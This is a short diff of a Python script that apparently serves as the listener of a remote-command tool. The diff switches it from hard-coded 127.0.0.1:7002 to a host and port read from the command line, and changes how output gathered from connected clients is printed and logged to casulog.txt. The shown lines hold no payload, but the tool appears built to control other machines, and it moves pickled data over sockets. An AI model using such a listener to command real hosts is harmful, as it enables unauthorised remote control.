@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!python3
 
 # Standard libraries only.
 import sys
@@ -7,18 +7,13 @@ import time
 import pickle
 
 
-#if len(sys.argv) != 3:
-#    print("usage:", sys.argv[0], "<lhost> <lport>")
-#    sys.exit(1)
-#
-#
-#lhost, lport = sys.argv[1], int(sys.argv[2])
+if len(sys.argv) != 3:
+    print("usage:", sys.argv[0], "<lhost> <lport>")
+    sys.exit(1)
 
-#lserver = (lhost, lport)
-lhost = "127.0.0.1"
-lport = 7002
+
+lhost, lport = sys.argv[1], int(sys.argv[2])
 lserver = (lhost, lport)
-
 dill_refuse = pickle.dumps("refused")
 cmd_list = []
 cmd_list2 = []
@@ -98,7 +93,7 @@ def return_cmds(sock, raddr, timeout=2):
                     return
             except:
                 pass
-        print(raddr, " | ", total_output)
+        print(total_output)
         with open('casulog.txt','a') as log:
             log.write(total_output)      
             return
